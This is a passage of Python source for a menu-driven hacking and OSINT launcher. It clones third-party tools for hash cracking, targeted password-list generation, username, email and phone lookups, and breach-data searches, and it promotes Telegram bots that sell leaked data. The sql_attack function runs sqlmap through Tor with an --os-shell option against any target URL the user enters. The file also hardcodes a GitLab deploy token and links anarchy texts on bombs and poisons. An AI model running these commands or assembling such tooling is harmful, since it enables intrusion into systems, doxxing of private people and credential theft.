        change()
        os.system("git clone https://github.com/AnonymousAt3/hashbreak.git")
        os.chdir("hashbreak")
        os.system("sudo chmod +x ./install.sh")
        os.system("sudo bash ./install.sh")
        os.system("sudo chmod +x ./hashbreak.sh")
        os.system("sudo bash ./hashbreak.sh")
        what_now()
    elif choice == "3":
        os.system("sudo apt install seclists")
        os.system("seclists")
        what_now()
    elif choice == "4":
        os.system("git clone https://github.com/TechnicalHeadquarter/cupp.git")
        os.chdir("cupp")
        os.system("pipenv run python3 cupp.py -i")
        what_now()
    elif choice == "5":
        change()
        steg()
    elif choice == "6":
        change()
        clear_screen()
        ascii_banner()
        header()
        print(
            "\033[91m1\033[0m)\033[90m List Sequence one Digit at a time                                                                  \033[91m2\033[0m)\033[90m List de Bruijn in Groups of 5"
        )
        footer()
        choice = input("Selection: ")
        if choice == "1":
            os.system("git clone https://github.com/Thr0wAway-n0w/deBruijn1.git")
            os.chdir("deBruijn1")
            os.system("pipenv run python3 car.py")
            what_now()
        elif choice == "2":
            os.system("git clone https://github.com/Thr0wAway-n0w/deBruijn2.git")
            os.chdir("deBruijn2")
            os.system("pipenv run python3 cars.py")
            what_now()
        elif choice == "BACK":
            clear_screen()
            passw()
        elif choice == "HELL":
            main_menu()
        else:
            print("\033[91m INVALID SELECTION\033[0m")
            time.sleep(1)
            clear_screen()
            ascii_banner()
            passw()
    elif choice == "7":
        subprocess.run(["sudo", "gem", "install", "pass-station"])
        clear_screen()
        print("1) List all default creds")
        print("2) Proceed with specific Search")
        choice = input("Selection: ")
        if choice == "1":
            asslist()
        elif choice == "2":
            station()
        else:
            print("INVALID SELECTION")
            time.sleep(2)
            clear_screen()
            passw()
    elif choice == "StegSeek":
        print(" ")
        print("\033[96mSteg Cracker")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[92mStegseek is a lightning fast steghide cracker that can be used to extract hidden data from files.":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        passw()

    elif choice == "Pwnd":
        print(" ")
        print("\033[96mPass Pwnd Checker")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[92mPython3 Program That Searches User input utilizing HaveIBeenPwnd.com's API to identify if password is secure or leaked":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        passw()
    elif choice == "HashBreak":
        print(" ")
        print("\033[96mHashBreak Hashed Password Cracker")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[92mCracks multiple different types of Hashed Passwords utilizing a simple straightforward interface. ":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        passw()
    elif choice == "SecLists":
        print(" ")
        print("\033[96mSecLists")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[92mRepo for Password Lists, Payloads and various other Goodies":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        passw()
    elif choice == "Cupp":
        print(" ")
        print("\033[96mCommon.User.Password.Profiler")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[92mEnter details and specifics about a target and save the generated list to increase your success rate.":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        passw()
    elif choice == "de Bruijn":
        print(" ")
        print("\033[96m de Bruijn Sequence")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[92mThis is the shortest sequence of numbers needed to press to Unlock Any Vehicle with a KeyPad. Most of the time I've seen it work in less than a minute. Quickest Possible-5 Seconds; Longest-17 minutes":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        passw()
    elif choice == "BACK":
        forbidden()
    elif choice == "HELL":
        main_menu()
    else:
        print("\033[91m INVALID SELECTION\033[0m")
        time.sleep(1)
        clear_screen()
        ascii_banner()
        passw()


def tfiles():
    clear_screen()
    ascii_banner()
    print(colored("FORBIDDEN KNOWLEDGE", "red", attrs=["reverse", "bold"]))
    header()
    print(
        "             \033[91m1\033[0m)\033[90m Anarchist Cookbook             \033[91m2\033[0m)\033[90m Black Circle             \033[91m3\033[0m)\033[90m DoomsDay             \033[91m4\033[0m)\033[90m Omnipotent Inc.                                   "
    )
    print(" ")
    print(
        "                            \033[93m5\033[95m) Firearm Manuals                               \033[93m6\033[95m) US Military Manuals"
    )
    footer()
    choice = input("\033[97mSelect an option: ")
    if choice == "1":
        clear_screen()
        os.system("lynx $dump http://www.textfiles.com/anarchy/")
        tfiles()
    elif choice == "2":
        clear_screen()
        os.system("lynx $dump http://www.textfiles.com/groups/BLACKCIRCLE/")
        tfiles()
    elif choice == "3":
        os.system("lynx $dump http://www.textfiles.com/survival/")
        tfiles()
    elif choice == "4":
        os.system("lynx $dump http://www.textfiles.com/groups/OMNIPOTENT/")
        tfiles()
    elif choice == "5":
        os.system("lynx $dump http://pdf.textfiles.com/manuals/FIREARMS/")
        tfiles()
    elif choice == "6":
        os.system("lynx $dump http://pdf.textfiles.com/manuals/MILITARY/")
        tfiles()
    elif choice == "BACK":
        forbidden()
    elif choice == "HELL":
        main_menu()
    elif choice == "Anarchist Cookbook":
        print(" ")
        print("\033[96mAnarchist Cookbook")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[92mThe Classic Banned Text. Also contains the Updated JollyRoger Version, Scams, Hacks, Lock picking, Incindiaries, Weapons, Inflict pain/Torture, and anything that goes BOOM. CTRL + C to Exit ":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        tfiles()
    elif choice == "Black Circle":
        print(" ")
        print("\033[96mBlack Circle")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[92mBlack Circle Productions, an IRC-centric anarchy and hacking group from the mid 90's, wrote this series of files to encourage people to cause mayhem. CTRL + C to Exit":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        tfiles()
    elif choice == "DoomsDay":
        print(" ")
        print("\033[96mDooms Day")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[92mA lot of survivalist files are dedicated to preparing for a coming collapse of society, assuming the worst and preparing for it. They're not waiting for the calvary; they're looking to eat the horses if they come this way. CTRL + C to Exit":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        tfiles()
    elif choice == "Omnipotent Inc.":
        print(" ")
        print("\033[96mOmnipotent Inc.")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[92mThe Reflex created files for Anarchy (bombs, poisons made from common plants, ect.) as well as Revenge. His hallmarks were good spelling, nice formatting, and intense hate of a guy named 'Rumpus' CTRL + C to Exit":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        tfiles()
    elif choice == "Firearm Manuals":
        print(" ")
        print("\033[96mFirearm Manuals")
        print(" ")
        print("", end="", flush=True)
        for char in " \033[92mEnough Said...CTRL + C to Exit":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        tfiles()
    elif choice == "US Military Manuals":
        print(" ")
        print("\033[96mUS Military Manuals")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[92mBroad assortment from Dear ol' Uncle Sam. Weapons, Tanks, Situational Training, Marksmanship, etc. CTRL + C to Exit":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        tfiles()
    else:
        print("\033[91m INVALID SELECTION\033[0m")
        time.sleep(1)
        clear_screen()
        ascii_banner()
        tfiles()


def osintio():
    print("\033[0mBot's Found On Telegram")
    print(" ")
    print("\033[96m0sintioBot")
    print(" ")
    print("", end="", flush=True)
    for (
        char
    ) in " \033[92mMirror of Russian Bot. Most well rounded and extensive results. 7 Day use without subscription \033[91mOR\033[0m just make new telegram with Burner numbers 'MUST BE VERIFIED'":
        print(char, end="", flush=True)
        time.sleep(0.04)
    time.sleep(1.5)
    tsar()


def tsar():
    print(" ")
    print("\033[96mTsar SnusBot")
    print(" ")
    print("", end="", flush=True)
    for (
        char
    ) in " \033[92mAKA @snusdb_bot. Decent for Breached Data \033[92mCOMPLETELY FREE*\033[0m 'minus the cost of your Soul, if you still have one'":
        print(char, end="", flush=True)
        time.sleep(0.04)
    time.sleep(3)
    breach()


def breach():
    clear_screen()
    ascii_banner()
    print(colored("DATA BREACH DATA", "red", attrs=["reverse", "bold"]))
    header()
    print(
        "                      \033[91m1\033[0m)\033[90m Bots                                                               \033[91m2\033[0m)\033[90m LeakSeek          "
    )
    footer()
    choice = input("\033[0mSelect an option: ")
    if choice == "1":
        osintio()
        time.sleep(1)
        tsar()
    elif choice == "2":
        clear_screen()
        ascii_banner()
        gitlab()
        what_now()
    elif choice == "Bots":
        print(" ")
        print("\033[96mTelegram Bots")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[92mLists Two Known Telegram Bots that allow for Instant DataBreach Results Based on User Query":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        breach()
    elif choice == "LeakSeek":
        print(" ")
        print("\033[96mLeakSeek")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[92mPython3 Program That Searches Various Data Breach Sources for a query String of Any Length. Modest in Size; currently 5.6 Million Credentials only":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        breach()
    elif choice == "BACK":
        forbidden()
    elif choice == "HELL":
        main_menu()
    else:
        print("\033[91m INVALID SELECTION\033[0m")
        time.sleep(1)
        breach()


def forbidden():
    clear_screen()
    ascii_banner()
    print(
        colored(
            "PASSWORDS/DATA LEAKS/FORBIDDEN KNOWLEDGE", "red", attrs=["reverse", "bold"]
        )
    )
    header()
    print(
        "                      \033[91m1\033[0m)\033[90m Passwords                      \033[91m2\033[0m)\033[90m DataBreach                     \033[91m3\033[0m)\033[90m The Text Files          "
    )
    footer()
    choice = input("\033[97mSelect an option: ")
    if choice == "1":
        passw()
    elif choice == "2":
        breach()
    elif choice == "3":
        tfiles()
    elif choice == "Passwords":
        print(" ")
        print("\033[96mPassword Menu")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[92mSteganography Cracker, Hash Cracker, Password Lists, User Specific Password Generators, +":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        forbidden()
    elif choice == "DataBreach":
        print(" ")
        print("\033[96mLeaked Data Menu")
        print(" ")
        print("", end="", flush=True)
        for char in " \033[92mPassPwnd Checker, Breached Credential Bots, LeakSeek, +":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        forbidden()
    elif choice == "The Text Files":
        print(" ")
        print("\033[96mForbidden Knowledge of The Ancient Ones")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[92mBlackCircle, DoomsDay, Anarchists CookBook, Omnipotent, US Military, FireArms":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        forbidden()
    elif choice == "BACK":
        main_menu()
    elif choice == "HELL":
        main_menu()
    else:
        print("\033[91m INVALID SELECTION\033[0m")
        time.sleep(1)
        forbidden()


def deep_dark():
    change()
    clear_screen()
    ascii_banner()
    print(
        colored("CLONING INTO DARKWEB TOOLS", "red", attrs=["reverse", "blink", "bold"])
    )
    header()
    os.system("git clone https://github.com/Thr0wAway-n0w/Deep.git")
    os.chdir("Deep")
    os.system("pipenv run python3 Dark.py")
    what_now()


def main_menu():
    change()
    clear_screen()
    ascii_banner()
    header()
    print(
        "       \033[91m1\033[0m)\033[90m Usernames                 \033[91m4\033[0m)\033[90m Frameworks            \033[91m7\033[0m)\033[90m GEO-0sint               \033[91m10\033[0m)\033[90m Passwords/Data Leaks/Forbidden Knowledge"
    )
    print(
        "       \033[91m2\033[0m)\033[90m Emails/Phone #'s          \033[91m5\033[0m)\033[90m Unclassified          \033[91m8\033[0m)\033[90m DeadMan Switch          \033[91m11\033[0m)\033[90m MULTI-MODE\033[0m"
    )
    print(
        "       \033[91m3\033[0m)\033[90m Networks                  \033[91m6\033[0m)\033[90m Cameras               \033[91m9\033[0m)\033[90m Tool Repo-Depo          \033[91m12\033[0m)\033[90m\033[93m \033[41mDante's Inferno\033[0m"
    )
    print(" ")
    print(
        "       \033[91m13\033[0m)\033[90m DeepWeb                  \033[91m14\033[0m)\033[90m Encode-Decode        \033[91m15\033[0m)\033[90m Mapscii                \033[91m16\033[0m) \033[41mEXIT\033[0m "
    )
    choice = input("\033[97mSelect an option: ")

    if choice == "1":
        menu()
    elif choice == "2":
        emails_menu()
    elif choice == "3":
        networks_menu()
    elif choice == "4":
        frameworks_menu()
    elif choice == "5":
        unclassified_menu()
    elif choice == "6":
        cameras_menu()
    elif choice == "7":
        geo_menu()
    elif choice == "8":
        clear_screen()
        deadman()
    elif choice == "9":
        clear_screen()
        ascii_banner()
        repo()
    elif choice == "10":
        clear_screen()
        ascii_banner()
        forbidden()
    elif choice == "11":
        clear_screen()
        multi_banner
        multi_menu()
    elif choice == "12":
        kaboom()
    elif choice == "13":
        change()
        deep_dark()
    elif choice == "15":
        print(" ")
        print("\033[96mInstructions")
        print(" ")
        print("", end="", flush=True)
        for char in " \033[91mA=ZOOM IN, Z=ZOOM OUT, ARROW KEYS TO MOVE, CTRL+Z TO GO BACK":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        os.system("telnet mapscii.me")
        what_now()
    elif choice == "16":
        clear_screen()
        ascii_banner()
        gahhh()
    elif choice == "14":
        change()
        os.system(
            "git clone https://github.com/Malwareman007/Msg-encoder-and-decoder.git"
        )
        os.chdir("Msg-encoder-and-decoder")
        os.system("pipenv run python3 Encoder-Decoder.py")
        what_now()
        clear_screen()
        ascii_banner()
        change()
        main_menu()
    elif choice == "Split":
        split()
        main_menu()
    else:
        print("\033[91m INVALID SELECTION\033[0m")
        time.sleep(1)
        change()
        main_menu()


def again1():
    choice = input("New User to Search: ")
    subprocess.run(
        [
            "maigret",
            choice,
            "--top-sites",
            "1800",
            "--no-recursion",
            "--retries",
            "2",
            "--stats",
            "--graph",
            "--html",
        ]
    )
    print(" ")
    print("\033[91m1\033[0m)\033[90m New Search")
    print("\033[91m2\033[0m)\033[90m View Reports")
    print("\033[91m3\033[0m)\033[90m Username Menu")
    option = input("Action: ")
    if option == "1":
        clear_screen()
        again1()
    elif option == "2":
        user_home = os.path.expanduser("~")
        os.chdir(os.path.join(user_home, "Desktop", "reports"))
        html_file1 = f"report_{username}_plain.html"
        html_file2 = f"report_{username}_graph.html"
        if os.path.exists(html_file1):
            webbrowser.open(os.path.join(os.getcwd(), html_file1))
        if os.path.exists(html_file2):
            webbrowser.open(os.path.join(os.getcwd(), html_file2))
            clear_screen()
            what_now()
        else:
            print(f"Error: File {html_file} not found")
    else:
        print("\033[91m INVALID SELECTION\033[0m")
        time.sleep(1)
        change()
        menu()


def again2():
    choice = input("New User to Search: ")
    subprocess.run(["pipx", "run", "sherlock-project", choice, "--nsfw"])
    print(" ")
    print("1) New Search?")
    print("2) Username Menu")
    choice = input("Enter Selection: ")
    if choice == "1":
        clear_screen()
        again2()
    elif choice == "2":
        change()
        menu()
    else:
        change()
        menu()


def again3():
    choice = input("Enter a User or Email to search: ")
    subprocess.run(["pipenv", "run", "python", "slash.py", choice])
    print(" ")
    print("1) New Search?")
    print("2) Username Menu")
    choice = input("Enter Selection: ")
    if choice == "1":
        clear_screen()
        again3()
    elif choice == "2":
        change()
        menu()
    else:
        print("\033[91m INVALID SELECTION\033[0m")
        time.sleep(1)
        change()
        menu()


def again4():
    clear_screen()
    username = input("Input User to Search: ")
    subprocess.run(["pipenv", "run", "python3", "aliastorm.py", username])
    print(" ")
    print("1) New Search?")
    print("2) Username Menu")
    choice = input("Enter Selection: ")
    if choice == "1":
        clear_screen()
        again4()
    elif choice == "2":
        change()
        menu()
    else:
        print("\033[91m INVALID SELECTION\033[0m")
        time.sleep(1)
        change()
        menu()


def again5():
    clear_screen()
    print("ENTER USERNAME")
    user = input("Username: ")
    subprocess.run(["go", "run", ".", "detect", "-n", user])
    while True:
        print("\033[91m1\033[0m)\033[90m New Search")
        print("\033[91m2\033[0m)\033[90m Username Menu")
        option = input("Action: ")
        if option == "1":
            clear_screen()
            again5()
        elif option == "2":
            menu()
        else:
            print("\033[91m INVALID SELECTION\033[0m")
            time.sleep(1)
            menu()


def again7():
    clear_screen()
    print("ENTER USERNAME")
    user = input("Username: ")
    subprocess.run(["pipenv", "run", "python3", "sagemode.py", "-U", user])
    while True:
        print("\033[91m1\033[0m)\033[90m New Search")
        print("\033[91m2\033[0m)\033[90m Username Menu")
        option = input("Action: ")
        if option == "1":
            clear_screen()
            again7()
        elif option == "2":
            menu()
        else:
            print("\033[91m INVALID SELECTION\033[0m")
            time.sleep(1)
            menu()


def menu():
    change()
    clear_screen()
    while True:
        clear_screen()
        try:
            my_art = AsciiArt.from_url(
                "https://i.postimg.cc/Jhbhr2hT/Screenshot-2024-04-21-at-05-13-59-e21459f8019688f030e3fd2ddf70830b-jpg-JPEG-Image-338-600-pixels.png"
            )
        except OSError as e:
            print(f"Could not load the image, server said: {e.code} {e.msg}")
        my_art.to_terminal()
        print(colored("USERNAME-0SINT", "red", attrs=["reverse", "blink", "bold"]))
        time.sleep(0.01)
        header()
        print(
            "       \033[91m1\033[0m)\033[90m Maigret                               \033[91m2\033[0m)\033[90m Slash                      \033[91m3\033[0m)\033[90m Sherlock                 \033[91m4\033[0m)\033[90m AliaStorm"
        )
        print(
            "       \033[91m5\033[0m)\033[90m DetectDee                              \033[91m6\033[0m)\033[90m Social Analyzer \033[92+                                                     \033[91m7\033[0m)\033[90m SageMode"
        )
        footer()
        choice = input("\033[0mSelect an option: ")
        if choice == "1":
            os.system("git clone https://github.com/soxoj/maigret")
            os.chdir("maigret")
            os.system("pipenv install .")
            username = input("Enter a username to search: ")
            html_file1 = f"report_{username}_plain.html"
            html_file2 = f"report_{username}_graph.html"
            print(colored("She THICC...", "red", attrs=["reverse", "blink", "bold"]))
            time.sleep(2)
            again1()
        elif choice == "2":
            clone_repo("https://github.com/theahmadov/slash.git", "slash")
            os.system("pipenv install -r requirements.txt")
            clear_screen()
            again3()
        elif choice == "3":
            os.system("pipenv install pipx")
            os.system("pipx install sherlock-project")
            again2()
        elif choice == "4":
            clone_repo("https://github.com/AnonCatalyst/AliaStorm.git", "AliaStorm")
            subprocess.run(
                ["pipenv", "install", "-r", "requirements.txt", "--break-system-packages"]
            )
            clear_screen()
            again4()
        elif choice == "5":
            change()
            os.system("git clone https://github.com/piaolin/DetectDee.git")
            os.chdir("DetectDee")
            os.system("go mod tidy")
            clear_screen()
            again5()
        elif choice == "6":
            change()
            os.system("pipenv install cheerio")
            import cheerio
            os.system(
                "sudo DEBIAN_FRONTEND=noninteractive apt-get install -y software-properties-common"
            )
            os.system("sudo add-apt-repository ppa:mozillateam/ppa -y")
            os.system(
                "sudo apt-get install -y firefox-esr tesseract-ocr git nodejs npm"
            )
            os.system("git clone https://github.com/qeeqbox/social-analyzer.git")
            os.chdir("social-analyzer")
            os.system("npm update")
            os.system("npm install")
            os.system("npm install loadash")
            clear_screen()
            print(
                colored(
                    "REFRESH WEB BROWSER PAGE TO START",
                    "red",
                    attrs=["reverse", "blink", "bold"],
                )
            )
            time.sleep(2)
            webbrowser.open("http://localhost:9005/app.html")
            os.system("npm start")
            what_now()
        elif choice == "7":
            change()
            os.system("git clone https://github.com/senran101604/sagemode")
            os.chdir("sagemode")
            os.system("pipenv run python3 -m pip install -r requirements.txt")
            clear_screen()
            again7()
        elif choice == "BACK":
            main_menu()
        elif choice == "HELL":
            main_menu()
        elif choice == "Maigret":
            print(" ")
            print("\033[96mMaigret")
            print(" ")
            print("", end="", flush=True)
            for (
                char
            ) in " \033[92mScrapes Web For User Profile Information from 1,800 Sites. Pulls Bio's, Names, UserId tokens, profile pics etc. Tests and removes non working sites. Opens web browser with results and spider graph.":
                print(char, end="", flush=True)
                time.sleep(0.04)
            time.sleep(3)
            menu()
        elif choice == "Slash":
            print(" ")
            print("\033[96mSlash")
            print(" ")
            print("", end="", flush=True)
            for (
                char
            ) in " \033[92mScrapes web for usernames, Pastebins, Github, personal info. Leak check for Email Addresses as well":
                print(char, end="", flush=True)
                time.sleep(0.04)
            time.sleep(3)
            menu()
        elif choice == "Sherlock":
            print(" ")
            print("\033[96mSherlock")
            print(" ")
            print("", end="", flush=True)
            for (
                char
            ) in " \033[92mUsername search across many sites. Also has a fair amount of false positives but includes NSFW sites. The OG, both Slash and Maigret were created in their own respective attempts to improve the project":
                print(char, end="", flush=True)
                time.sleep(0.04)
            time.sleep(3)
            menu()
        elif choice == "AliaStorm":
            print(" ")
            print("\033[96mAliaStorm")
            print(" ")
            print("", end="", flush=True)
            for (
                char
            ) in " \033[92mUsername search. When selecting options, avoid including html information in the Results for readibility.":
                print(char, end="", flush=True)
                time.sleep(0.04)
            time.sleep(3)
            menu()
        elif choice == "DetectDee":
            print(" ")
            print("\033[96mDetectDee")
            print(" ")
            print("", end="", flush=True)
            for char in " \033[92mUsername search across 600 websites":
                print(char, end="", flush=True)
                time.sleep(0.04)
            time.sleep(3)
            menu()
        elif choice == "Social Analyzer":
            print(" ")
            print("\033[96mWeb UI")
            print(" ")
            print("", end="", flush=True)
            for (
                char
            ) in " \033[92mOne of my personal Favorites. Utilized by some Law Enforement Agencies":
                print(char, end="", flush=True)
                time.sleep(0.04)
            time.sleep(3)
            menu()
        elif choice == "SageMode":
            print(" ")
            print("\033[96mSage Mode")
            print(" ")
            print("", end="", flush=True)
            for (
                char
            ) in " \033[92mFast and Accurate, but list is significantly less. A Quality over Quantity Scanner":
                print(char, end="", flush=True)
                time.sleep(0.04)
            time.sleep(3)
            menu()
        else:
            print("\033[91m INVALID SELECTION\033[0m")
            time.sleep(1)
            menu()


def landlubber():
    change()
    os.system("git clone https://github.com/drooling/phosint")
    os.chdir("phosint")
    os.system("git fetch")
    os.system("git pull")
    os.system("pipenv install -r requirements.txt")
    clear_screen()
    print("Please Input Number \033[92m EXAMPLE 1112223333")
    choice = input("enter: ")

    try:
        subprocess.run(["pipenv", "run", "python3", "phosint.py", choice])
    except Exception as e:
        print(f"Error: {e}")
        what_now()


def cell():
    os.system("pipenv run python3 num1.py")
    print(" ")
    print("1) New Search")
    print("2) Back")
    print("3) Main Menu")
    choice = input("Select: ")
    if choice == "1":
        cell()
    elif choice == "2":
        emails_menu()
    elif choice == "3":
        main_menu()
    else:
        print("INVALID SELECTION")
        time.sleep(1)
        clear_screen()
        cell()


def cellphone():
    clear_screen()
    os.system("git clone https://github.com/Thr0wAway-n0w/num.git")
    os.chdir("num")
    cell()


def emails_menu():
    change()
    clear_screen()
    ascii_banner()
    print(colored("EMAIL / PHONE 0SINT", "red", attrs=["reverse", "blink", "bold"]))
    header()
    print(
        "                \033[91m1\033[0m)\033[90m EMAIL                                                                     \033[91m2\033[0m)\033[90m PHONE "
    )
    footer()
    choice = input("\033[0mSelect an option: ")

    if choice == "1":
        venv_command = "python3 -m venv .lib_venv"
        os.system(venv_command)
        subprocess.run(["git", "clone", "https://github.com/megadose/holehe"])
        os.chdir("holehe")
        os.system("docker build . -t my-holehe-image")
        clear_screen()
        email = input("Enter the email to search: ")
        subprocess.run(["docker", "run", "my-holehe-image", email])
        process = subprocess.Popen(
            ["docker", "run", "my-holehe-image", "holehe", email],
            stdout=subprocess.PIPE,
        )
        result = process.communicate()[0].decode("utf-8")
        result_output = result.replace("[+]", f"{Fore.GREEN}[+]{Style.RESET_ALL}")
        result_output = result_output.replace("[-]", f"{Fore.RED}[-]{Style.RESET_ALL}")
        result_output = result_output.replace(
            "[x]", f"{Fore.YELLOW}[x]{Style.RESET_ALL}"
        )
        result_output = result_output.replace(
            "[!]", f"{Fore.MAGENTA}[!]{Style.RESET_ALL}"
        )
        print(result_output)
        what_now()
    elif choice == "2":
        clear_screen()
        ascii_banner()
        header()
        print(
            "                 \033[91m1\033[0m)\033[90m Land Line                                                                    \033[91m2\033[0m)\033[90m NumChecker"
        )
        footer()
        choice = input("Select an option: ")
        if choice == "1":
            landlubber()
        elif choice == "2":
            cellphone()
        elif choice == "BACK":
            emails_menu()
        elif choice == "HELL":
            main_menu()
        else:
            print("\033[91m INVALID SELECTION\033[0m")
            time.sleep(1)
            emails_menu()
    elif choice == "BACK":
        main_menu()
    elif choice == "HELL":
        main_menu
    elif choice == "EMAIL":
        print(" ")
        print("\033[96mHolehe")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[92mWill Return list of sites that an email is registered on. Does contain False Negatives.":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        emails_menu()
    elif choice == "PHONE":
        print(" ")
        print("\033[96mPhone Numbers")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[92mIf Landline, will return names of people Associated with that number as well as their physical Address. Cellphone's return Carrier information and General Location data":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        emails_menu()
    else:
        print("\033[91m INVALID SELECTION\033[0m")
        time.sleep(1)
        emails_menu()


def gitlab():
    clear_screen()
    ascii_banner()
    header()
    print(colored("CLONING LeakSeek", "red", attrs=["reverse", "blink", "bold"]))
    time.sleep(2)
    os.system(
        "git clone https://gitlab+deploy-token-4261899:gldt-Sz_XsWRrBG5sdVU2jXNE@gitlab.com/us3run0wn/LeakSeek.git"
    )
    os.chdir("LeakSeek")
    os.system("git fetch")
    os.system("git pull")
    os.system("pipenv run python3 LeakSeek.py")
    what_now()


def clone_repo2(url, folder_name):
    venv_command = "python3 -m venv .lib_venv"
    os.system(venv_command)
    os.chdir("holehe")
    os.system("git clone " + url)
    os.chdir(folder_name)
    os.system("git fetch")
    os.system("git pull")


def wifi_boost():
    os.system("git clone https://github.com/Takaklas/Wifi-Indoor-Location.git")
    os.chdir("Wifi-Indoor-Location")
    os.system("git fetch")
    os.system("git pull")
    subprocess.run(["pipenv", "run", "python3", "net.py"])
    networks_menu()


def sql_attack():
    os.system("sudo apt install tor")
    os.system("sudo apt install torbrowser-launcher")
    os.system("sudo service tor start")
    os.system(
        "git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev"
    )
    os.chdir("sqlmap-dev")
    os.system("git fetch")
    os.system("git pull")
    clear_screen()
    print(colored("SQL ATTACK", "red", attrs=["reverse", "blink", "bold"]))
    target_url = input("Enter the target URL: ")

    sqlmap_command = f'python3 sqlmap.py -u "{target_url}" -f --banner --dbs -g --tor -a --os-shell --batch'
    os.system(sqlmap_command)
    what_now()


def lynis_sys():
    os.system("git clone https://github.com/CISOfy/lynis")
    os.chdir("lynis")
    os.system("git fetch")
    os.system("git pull")
    clear_screen()
    ascii_banner()
    header()
    print("Selection:")
    print("\033[91m1\033[0m)\033[90m System Audit")
    print("\033[91m2\033[0m)\033[90m GO-BACK")
    choice = input("Enter your choice: ")

    if choice == "1":
        os.system("./lynis audit system")
        what_now()
    elif choice == "2":
        print("\033[91mGO-BACK\033[0m")
        main_menu()
    else:
        print("\033[91m INVALID SELECTION\033[0m")
        time.sleep(1)
        change()
        networks_menu()


def ip_lookup():
    clear_screen()
    ascii_banner()
    subprocess.call(["git", "clone", "https://gitlab.com/Ar-baaz/IP-Lookup-Tool.git"])
    os.chdir("IP-Lookup-Tool")
    subprocess.call(["python3", "-m", "pip", "install", "flask"])
    subprocess.call(["python3", "-m", "pip", "install", "ipapi"])
    os.system("pipenv run python3 app.py")
    what_now()


def chop_chop():
    clear_screen()
    print(
        colored(
            "                             OPTIMIZING WiFi                           ",
            "red",
            attrs=["reverse", "blink", "bold"],
        )
    )
    print(
        "\033[0mYOU HAVE \033[91m30\033[0m SECONDS\033[0m TO\033[0m \033[91mDISCONNECT\033[0m THEN \033[91mRECONNECT\033[0m YOUR WIFI. \033[91mCHOP CHOP!!!\033[0m"
    )


def deepfakes():
    print("coming soon")
    time.sleep(1)
    jigsaw()


def social():
    clear_screen()
    JIGSAW()
    print(colored("SOCIAL MEDIA", "red", attrs=["reverse", "blink", "bold"]))
    header()
    print(
        "                      \033[91m1\033[0m)\033[90m TikTokBots                                                                     \033[91m2\033[0m)\033[90m InstaSham                   "
    )
    footer()
    choice = input("Take Your Pick: ")
    if choice == "1":
        webbrowser.open("https://fireliker.com")
        social()
    elif choice == "2":
        webbrowser.open("https://www.idigic.net/trial/")
        social()
    elif choice == "TikTokBots":
        print(" ")
        print("\033[96mTikTokBot")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[92mAllows for over 200 video views Instantly. Cooldown time of 7 minutes before you can use it again":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        social()
    elif choice == "InstaSham":
        print(" ")
        print("\033[96mInstaGram Bots")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[92mEnough said. Only 10 per free trial so just switch to a different ip on your VPN and you can continue":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        social()
    elif choice == "BACK":
        jigsaw()
    elif choice == "HELL":
        main_menu()
    else:
        print("\033[91m INVALID SELECTION\033[0m")
        time.sleep(1)
        change()
        social()


def jigsaw():
    clear_screen()
    JIGSAW()
    print(colored("PUPPET MASTER MENU", "red", attrs=["reverse", "blink", "bold"]))
    header()
    print(
        "                      \033[91m1\033[0m)\033[90m Details                     \033[91m2\033[0m)\033[90m Social Media                     \033[91m3\033[0m)\033[90m DeepFakes          "
    )
    footer()
    choice = input("\033[97mSelect an option: ")
    if choice == "1":
        print(
            colored(
                "CTRL + X TO EXIT PUPPET DETAILS",
                "red",
                attrs=["reverse", "blink", "bold"],
            )
        )
        os.system("git clone https://github.com/jaskaran2002/Sock-Puppet-Generator.git")
        os.chdir("Sock-Puppet-Generator")
        os.system("git fetch")
        os.system("git pull")
        os.system("pipenv run python3 main.py")
        time.sleep(3)
        os.system("nano output.json")
        jigsaw()
    elif choice == "2":
